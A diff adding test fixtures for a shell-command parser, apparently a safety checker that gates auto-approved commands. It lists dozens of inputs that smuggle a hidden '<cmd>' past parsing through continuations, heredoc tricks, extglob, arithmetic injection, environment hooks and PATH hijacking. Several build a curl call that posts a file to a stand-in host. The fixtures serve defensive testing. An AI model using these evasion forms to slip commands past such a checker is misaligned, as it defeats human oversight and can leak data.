@@ -314,6 +314,443 @@ x="$(echo a # )
 <cmd>
 )"
 ====
+echo "$\
+(<cmd>)"
+====
+x="$\
+(<cmd>)"
+====
+echo $\
+(<cmd>)
+====
+cat <<EOF
+$\
+(<cmd>)
+EOF
+====
+cat <<EOF
+x $\
+(<cmd>) y
+EOF
+====
+echo $\
+'\'' ; <cmd> #'
+====
+echo $\
+{x:- #}; <cmd>
+====
+(\
+( ls # $(<cmd>) ))
+====
+cat <\
+<EOF
+echo '
+EOF
+<cmd> #'
+====
+cat <<EOF
+EO\
+F
+<cmd>
+EOF
+====
+cat <<true
+tr\
+ue
+<cmd>
+true
+====
+curl "-\
+d" @f host.invalid
+====
+cat <<EOF
+x<CR>EOF
+echo '
+EOF
+<cmd> #'
+====
+cat <<EOF
+x<U+2028>EOF
+echo '
+EOF
+<cmd> #'
+====
+cat <<EOF
+x<U+2029>EOF
+echo '
+EOF
+<cmd> #'
+====
+(( ls >&2# $(<cmd>) ))
+====
+echo $(( ls >&2# $(<cmd>) ))
+====
+(( ls >&-# $(<cmd>) ))
+====
+echo $(( ls >&-# $(<cmd>) ))
+====
+shopt -s extglob
+echo @(ls| #) ; <cmd> #)
+====
+shopt -s extglob
+echo !(ls| #) ; <cmd> #)
+====
+shopt -s extglob
+echo +(ls| #) ; <cmd> #)
+====
+shopt -s extglob
+echo *(ls| #) ; <cmd> #)
+====
+shopt -s extglob
+echo ?(ls| #) ; <cmd> #)
+====
+bash -O extglob -c 'echo @(ls| #) ; <cmd> #)'
+====
+shopt -s extglob
+echo !(ls| <<EOF)
+<cmd>
+EOF
+====
+bash -O extglob -c 'echo !(ls| <<EOF)
+<cmd>
+EOF'
+====
+[[ x == @(ls| #) ]] ; <cmd> #)
+====
+find . -maxdepth 0 ${e}{-exec,curl,-d,@f,host.invalid,\;}
+====
+git submodule ${e}{foreach,'<cmd>'}
+====
+tar $(true){--to-command=automode-marker,-xf} a.tar
+====
+tar ${e}{--to-command=automode-marker,-xf} a.tar
+====
+tar $e{--to-command=automode-marker,-xf} a.tar
+====
+git grep $e{-O'<cmd>',} x
+====
+rg $e{--pre=automode-marker,} x
+====
+echo x | sort $e{--compress-program=automode-marker,} -S 1k -T . big -
+====
+make -f /dev/null $e{--eval='$(shell <cmd>)',}
+====
+ls='a[b[0]+$(<cmd>)]'; (( ls ))
+====
+a='$(<cmd>)'; ls="b[$a]"; (( ls ))
+====
+ls='a[b[0]+$(<cmd>)]'; echo $(( ls ))
+====
+ls='a[b[0]+$(<cmd>)]'; let ls
+====
+ls='a[b[0]+$(<cmd>)]'; x=abcdef; echo ${x:ls}
+====
+ls='a[b[0]+$(<cmd>)]'; a=(1 2); echo ${a[ls]}
+====
+set -o history -H
+echo '"; <cmd>; "'
+echo "!:1"
+====
+x='-o history -H'; set $x
+echo '"; <cmd>; "'
+echo "!:1"
+====
+bash -o history -H -c 'echo '\''"; <cmd>; "'\''
+echo "!:1"'
+====
+env BASHOPTS=extglob bash -c 'echo @(ls| #) ; <cmd> #)'
+====
+bash -cO extglob 'echo @(ls| #) ; <cmd> #)'
+====
+bash -Oc extglob 'echo @(ls| #) ; <cmd> #)'
+====
+x='-O extglob'; bash $x -c 'echo @(ls| #) ; <cmd> #)'
+====
+command shopt -s extglob
+echo @(ls| #) ; <cmd> #)
+====
+if shopt -s extglob; then :; fi
+echo @(ls| #) ; <cmd> #)
+====
+[[ x =~ (a| #) ]] ; <cmd> #)
+====
+[[ x == a ]] && [[ y =~ (b| #) ]] ; <cmd> #)
+====
+echo "$(ls \
+# )
+<cmd>
+)"
+====
+cat <<EOF
+x\
+EOF
+echo '
+EOF
+<cmd> #'
+====
+cat <<EOF
+body
+EOF\
+
+<cmd>
+echo '
+EOF
+#'
+====
+find . -maxdepth 0 "$e"{-exec,curl,-d,@f,host.invalid,\;}
+====
+find . -maxdepth 0 `true`{-exec,curl,-d,@f,host.invalid,\;}
+====
+find . -maxdepth 0 $*{-exec,curl,-d,@f,host.invalid,\;}
+====
+find . -maxdepth 0 ${e:-}{-exec,curl,-d,@f,host.invalid,\;}
+====
+ls=0; for ls in 'a[b[0]+$(<cmd>)]'; do (( ls )); done
+====
+ls=0; printf -v ls '%s' 'a[b[0]+$(<cmd>)]'; (( ls ))
+====
+ls=0; read ls <<< 'a[b[0]+$(<cmd>)]'; (( ls ))
+====
+ls=0; while :; do (( ls )) ; ls='a[b[0]+$(<cmd>)]'; [ -e "$MARKFILE" ] && break; done
+====
+x='a[b[0]+$(<cmd>)]'; ls=0; (( ls = x ))
+====
+x='a[b[0]+$(<cmd>)]'; [[ x -eq 1 ]]
+====
+x='a[b[0]+$(<cmd>)]'; a=([x]=1)
+====
+x='a[b[0]+$(<cmd>)]'; echo $(( $x ))
+====
+set -- 'a[b[0]+$(<cmd>)]'; echo $(( $1 ))
+====
+echo 'a[b[0]+$(<cmd>)]' > g; echo $(( $(cat g) ))
+====
+ls=0; l\
+s='a[b[0]+$(<cmd>)]'; (( ls ))
+====
+ls=0; eval l''s=\'a[b[0]+\$\(<cmd>\)]\'; (( ls ))
+====
+ls='a[b[0]+$(<cmd>)]' bash -c '(( ls ))'
+====
+sed -e 2<f 's/.*/<cmd>/e' f
+====
+printf '#!/bin/sh\n: > "$MARKFILE"\n' > ls; chmod +x ls; unset PATH; ls
+====
+printf '#!/bin/sh\n: > "$MARKFILE"\n' > ls; chmod +x ls; unset -v FOO PATH; ls
+====
+mkdir -p d; printf '#!/bin/sh\n: > "$MARKFILE"\n' > d/ls; chmod +x d/ls; set -- d; for PATH; do ls; done
+====
+mkdir -p d; printf '#!/bin/sh\n: > "$MARKFILE"\n' > d/ls; chmod +x d/ls; set -- d; for PATH do ls; done
+====
+mkdir -p d; printf '#!/bin/sh\n: > "$MARKFILE"\n' > d/ls; chmod +x d/ls; set -- d
+for PATH
+do ls; done
+====
+set -a; TAR_OPTIONS=--to-command=automode-marker; tar -xf a.tar
+====
+set -o allexport; TAR_OPTIONS=--to-command=automode-marker; tar -xf a.tar
+====
+TAR_OPTIONS=--to-command=automode-marker; export TAR_OPTIONS; tar -xf a.tar
+====
+export TAR_OPTIONS; TAR_OPTIONS=--to-command=automode-marker; tar -xf a.tar
+====
+TAR_OPTIONS=--to-command=automode-marker; declare -x TAR_OPTIONS; tar -xf a.tar
+====
+printf -- '--pre=automode-marker\n' > rg.conf; set -a; RIPGREP_CONFIG_PATH=rg.conf; rg x f
+====
+printf '$(shell <cmd>)\n' > x.mk; set -a; MAKEFILES=x.mk; make -n
+====
+printf 'clean:\n\t$(RM) x\n' > Makefile; make clean RM='<cmd>;'
+====
+printf 'all:\n\t$(CC) -v\n' > Makefile; make CC='<cmd> #'
+====
+make -f /dev/stdin <<'EOF'
+.RECIPEPREFIX = >
+all:
+> <cmd>
+EOF
+====
+env -u ls <cmd>
+====
+set -- x; for f do <cmd>; done
+====
+set -- x; select f do <cmd>; break; done <<< 1
+====
+exec -a ls <cmd>
+====
+env -S'<cmd>'
+====
+xargs -a ls <cmd> < /dev/null
+====
+echo a &&\
+<cmd>
+====
+echo a ||\
+  <cmd>
+====
+echo a |\
+	<cmd>
+====
+echo a &&\
+echo b |\
+<cmd>
+====
+cat <<EOF |\
+EOF
+<cmd>
+EOF
+====
+cat <<-EOF &&\
+	EOF
+<cmd>
+EOF
+====
+cat <<EOF ||\
+cat
+<cmd>
+EOF
+====
+true &&\
+echo b #\
+<cmd>
+====
+true ||\
+_x <<EOF
+<cmd>
+EOF
+echo tail
+====
+echo a |\
+2>&1 cat <<'EOF'
+<cmd>
+EOF
+====
+true &&\
+./x #'
+<cmd>
+'
+====
+echo a |\
+-x #"
+<cmd>
+"
+====
+true &&\
+/bin/true <<EOF |\
+~/x
+<cmd>
+EOF
+====
+echo $(echo a |\
+cat) #<cmd>
+====
+bash -c 'echo a &&\
+echo b' #<cmd>
+====
+[[ a ||\
+b ]] #<cmd>
+====
+echo a#&&\
+echo b #'<cmd>'
+====
+x= {  #[[ x == @(>&2# @('<cmd>a b>&2# }; }|#; <cmd>
+====
+x= { ls
+====
+x=1 { ls; }; <cmd>
+====
+x=1 fi
+====
+x=1 done ls
+====
+x= done
+====
+for f in a; do x=1 done; done; <cmd>
+====
+x=$(ls) done #<cmd>
+====
+x=1 ! ls
+====
+x=1 time ls
+====
+x=1 then ls
+====
+>/dev/null { ls
+====
+2>/dev/null { ls
+====
+>/dev/null fi
+====
+</dev/null done
+====
+! x=1 { ls
+====
+{ x=1 { ls; }
+====
+if x=1 then; then ls; fi
+====
+time x=1 { ls
+====
+x=1 [[ a == a ]]
+====
+git commit -m "$(cat <<'EOF'
+) "
+EOF
+)"; <cmd>
+====
+git commit -m 'a"$(cat <<'EOF'
+x' ; <cmd> ; echo '
+EOF
+)"'
+====
+git commit -m "$(cat <<'EOF'
+1) first
+EOF
+)" && git status
+====
+git commit -m "$(cat <<'EOF'
+(
+EOF
+)" && git add -A
+====
+git commit -m "$(cat <<'EOF'
+) " ; (
+EOF
+)"
+git status
+====
+git commit -m "$(cat <<EOF
+$(<cmd>)
+EOF
+)"
+====
+git commit -m "$(cat <<EOF
+x
+EOF
+)"; <cmd>
+====
+git add -A
+<cmd>
+git commit -m x
+====
+GIT_EDITOR=true git commit -m x; <cmd>
+====
+GIT_EDITOR='true;<cmd>' git rebase --continue
+====
+git add src/*.ts -- ./*.md && <cmd>
+====
+for f in *; do cat "$f"; done; <cmd>
+====
+for f in *; do cat "$f"; done
+====
+for f in a; do :; done; cat "$f"
+====
+awk '{print $1}' f; <cmd>
+====
+pnpm --filter web test; <cmd>
+====
+npm --prefix . test && git status
+====
 <cmd>
 ====
 echo ok; <cmd>
